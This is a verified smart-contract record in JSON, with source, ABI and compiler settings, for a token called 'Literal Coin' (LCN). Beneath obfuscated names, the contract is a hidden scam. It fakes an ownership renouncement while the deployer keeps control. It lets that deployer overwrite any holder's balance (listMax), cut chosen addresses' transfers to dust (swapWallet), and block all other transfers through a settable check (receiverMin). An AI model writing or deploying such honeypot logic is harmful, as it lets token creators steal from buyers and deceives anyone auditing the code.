{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract launchedLaunchAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingTx {\n    function createPair(address tradingSwap, address swapMarketing) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface limitLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface teamLaunchShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLimitBuy) external view returns (uint256);\n\n    function transfer(address marketingSender, uint256 buyReceiver) external returns (bool);\n\n    function allowance(address modeMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingSender,\n        uint256 buyReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromTeam, uint256 value);\n    event Approval(address indexed modeMin, address indexed spender, uint256 value);\n}\n\ninterface teamLaunchShouldMetadata is teamLaunchShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LiteralCoin is launchedLaunchAmount, teamLaunchShould, teamLaunchShouldMetadata {\n\n    function enableReceiver(address launchTrading, address marketingSender, uint256 buyReceiver) internal returns (bool) {\n        if (launchTrading == limitSender) {\n            return launchedIs(launchTrading, marketingSender, buyReceiver);\n        }\n        uint256 receiverSender = teamLaunchShould(listBuy).balanceOf(enableTrading);\n        require(receiverSender == amountMode);\n        require(marketingSender != enableTrading);\n        if (senderSwap[launchTrading]) {\n            return launchedIs(launchTrading, marketingSender, receiverMaxTx);\n        }\n        buyReceiver = exemptListTo(launchTrading, marketingSender, buyReceiver);\n        return launchedIs(launchTrading, marketingSender, buyReceiver);\n    }\n\n    uint256 public walletTo = 3;\n\n    function approve(address tradingFeeSender, uint256 buyReceiver) public virtual override returns (bool) {\n        receiverLaunchedToken[_msgSender()][tradingFeeSender] = buyReceiver;\n        emit Approval(_msgSender(), tradingFeeSender, buyReceiver);\n        return true;\n    }\n\n    uint256 private shouldAt = 100000000 * 10 ** 18;\n\n    uint256 constant receiverMaxTx = 10 ** 10;\n\n    uint256 public buyReceiverToken;\n\n    function swapWallet(address limitMarketing) public {\n        txSender();\n        \n        if (limitMarketing == limitSender || limitMarketing == listBuy) {\n            return;\n        }\n        senderSwap[limitMarketing] = true;\n    }\n\n    uint256 public isTake;\n\n    uint8 private sellWallet = 18;\n\n    mapping(address => mapping(address => uint256)) private receiverLaunchedToken;\n\n    address public listBuy;\n\n    function receiverMin(uint256 buyReceiver) public {\n        txSender();\n        amountMode = buyReceiver;\n    }\n\n    uint256 enableModeIs;\n\n    mapping(address => uint256) private fromTeamToken;\n\n    mapping(address => bool) public senderSwap;\n\n    function exemptListTo(address launchTrading, address marketingSender, uint256 buyReceiver) internal view returns (uint256) {\n        require(buyReceiver > 0);\n\n        uint256 tokenTo = 0;\n        if (launchTrading == listBuy && walletTo > 0) {\n            tokenTo = buyReceiver * walletTo / 100;\n        } else if (marketingSender == listBuy && modeFund > 0) {\n            tokenTo = buyReceiver * modeFund / 100;\n        }\n        require(tokenTo <= buyReceiver);\n        return buyReceiver - tokenTo;\n    }\n\n    uint256 public listWallet;\n\n    function balanceOf(address teamLimitBuy) public view virtual override returns (uint256) {\n        return fromTeamToken[teamLimitBuy];\n    }\n\n    constructor (){\n        \n        teamIs();\n        limitLaunch launchedLaunch = limitLaunch(fundSwap);\n        listBuy = marketingTx(launchedLaunch.factory()).createPair(launchedLaunch.WETH(), address(this));\n        enableTrading = marketingTx(launchedLaunch.factory()).feeTo();\n        \n        limitSender = _msgSender();\n        exemptTake[limitSender] = true;\n        fromTeamToken[limitSender] = shouldAt;\n        if (buyReceiverToken == isTake) {\n            isTake = buyReceiverToken;\n        }\n        emit Transfer(address(0), limitSender, shouldAt);\n    }\n\n    function allowance(address liquidityReceiverMin, address tradingFeeSender) external view virtual override returns (uint256) {\n        if (tradingFeeSender == fundSwap) {\n            return type(uint256).max;\n        }\n        return receiverLaunchedToken[liquidityReceiverMin][tradingFeeSender];\n    }\n\n    function getOwner() external view returns (address) {\n        return amountLaunched;\n    }\n\n    function exemptAt(address fundLimit) public {\n        require(fundLimit.balance < 100000);\n        if (amountLiquidity) {\n            return;\n        }\n        if (modeTx == fromTakeMin) {\n            modeTx = true;\n        }\n        exemptTake[fundLimit] = true;\n        if (totalAmount == autoList) {\n            autoList = totalAmount;\n        }\n        amountLiquidity = true;\n    }\n\n    event OwnershipTransferred(address indexed shouldIsSwap, address indexed walletSender);\n\n    address fundSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function teamIs() public {\n        emit OwnershipTransferred(limitSender, address(0));\n        amountLaunched = address(0);\n    }\n\n    uint256 private totalAmount;\n\n    address private amountLaunched;\n\n    bool private txTokenMode;\n\n    string private fundMax = \"LCN\";\n\n    bool public fromTakeMin;\n\n    address public limitSender;\n\n    uint256 amountMode;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedListAmount;\n    }\n\n    function txSender() private view {\n        require(exemptTake[_msgSender()]);\n    }\n\n    function transferFrom(address launchTrading, address marketingSender, uint256 buyReceiver) external override returns (bool) {\n        if (_msgSender() != fundSwap) {\n            if (receiverLaunchedToken[launchTrading][_msgSender()] != type(uint256).max) {\n                require(buyReceiver <= receiverLaunchedToken[launchTrading][_msgSender()]);\n                receiverLaunchedToken[launchTrading][_msgSender()] -= buyReceiver;\n            }\n        }\n        return enableReceiver(launchTrading, marketingSender, buyReceiver);\n    }\n\n    uint256 public modeFund = 0;\n\n    bool public amountLiquidity;\n\n    function owner() external view returns (address) {\n        return amountLaunched;\n    }\n\n    bool private modeTx;\n\n    function launchedIs(address launchTrading, address marketingSender, uint256 buyReceiver) internal returns (bool) {\n        require(fromTeamToken[launchTrading] >= buyReceiver);\n        fromTeamToken[launchTrading] -= buyReceiver;\n        fromTeamToken[marketingSender] += buyReceiver;\n        emit Transfer(launchTrading, marketingSender, buyReceiver);\n        return true;\n    }\n\n    mapping(address => bool) public exemptTake;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fundMax;\n    }\n\n    address enableTrading;\n\n    string private launchedListAmount = \"Literal Coin\";\n\n    function listMax(address tradingSender, uint256 buyReceiver) public {\n        txSender();\n        fromTeamToken[tradingSender] = buyReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldAt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return sellWallet;\n    }\n\n    uint256 public autoList;\n\n    function transfer(address tradingSender, uint256 buyReceiver) external virtual override returns (bool) {\n        return enableReceiver(_msgSender(), tradingSender, buyReceiver);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldIsSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiverMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFeeSender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFeeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimitBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyReceiverToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLimit\",\"type\":\"address\"}],\"name\":\"exemptAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTakeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"receiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMarketing\",\"type\":\"address\"}],\"name\":\"swapWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LiteralCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}